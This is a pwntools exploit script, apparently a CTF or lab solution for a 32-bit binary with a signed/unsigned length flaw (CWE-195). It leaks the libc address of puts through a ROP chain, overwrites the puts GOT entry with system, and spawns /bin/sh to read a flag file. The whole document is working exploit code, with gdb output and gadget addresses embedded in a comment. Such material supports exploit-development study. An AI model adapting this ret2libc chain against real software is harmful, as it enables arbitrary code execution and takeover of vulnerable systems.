from pwn import *

context.log_level='debug'
libc = ELF('/lib32/libc.so.6')
s = process('./CB')

'''
gdb-peda$ p puts
$1 = {<text variable, no debug info>} 0x8048410 <puts@plt>
gdb-peda$ x/i 0x8048410
   0x8048410 <puts@plt>:	jmp    DWORD PTR ds:0x804a01c
gdb-peda$ p read
$2 = {<text variable, no debug info>} 0x80483e0 <read@plt>

ROPgadget --binary ./cwe_195_e
0x08048759 : pop esi ; pop edi ; pop ebp ; ret
'''

puts = 0x8048410
got_puts = 0x804a01c
read = 0x80483e0
pppr = 0x08048759

s.recvuntil('4.')
s.sendline('2')
s.recvuntil('32 \n')
s.sendline('44')
s.send(p32(pppr+3)*20+p32(puts)+p32(pppr+2)+p32(got_puts)+p32(read)+p32(pppr)+p32(0)+p32(got_puts)+p32(4+8)+p32(puts)+p32(got_puts+4)*2)
s.recvuntil('4. beak\n')
# raw_input()
s.sendline('4')
leak_puts = u32(s.recv(4))
leak_system = leak_puts-libc.symbols['puts']+libc.symbols['system']
print 'leak_puts: 0x%x'%leak_puts

s.send(p32(leak_system)+'/bin/sh\x00')

s.sendline("echo 1;cat flag")
s.recvuntil("1\n")
print "flag: "+s.recv(1024)
s.interactive()

